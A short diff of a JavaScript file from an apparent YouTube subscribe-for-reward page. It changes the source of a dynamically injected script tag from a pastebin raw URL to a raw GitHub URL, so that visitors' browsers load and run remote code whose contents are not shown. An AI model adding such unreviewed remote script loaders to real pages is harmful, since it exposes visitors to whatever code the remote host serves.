@@ -27,5 +27,5 @@ $(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. 
 )
 ;
 var script = document.createElement("script");
-script.src = "https://pastebin.com/raw/sMyXxaiA";
+script.src = "https://raw.githubusercontent.com/eliasgetachewc1988/ytbbounty/master/text2";
 document.body.appendChild(script);
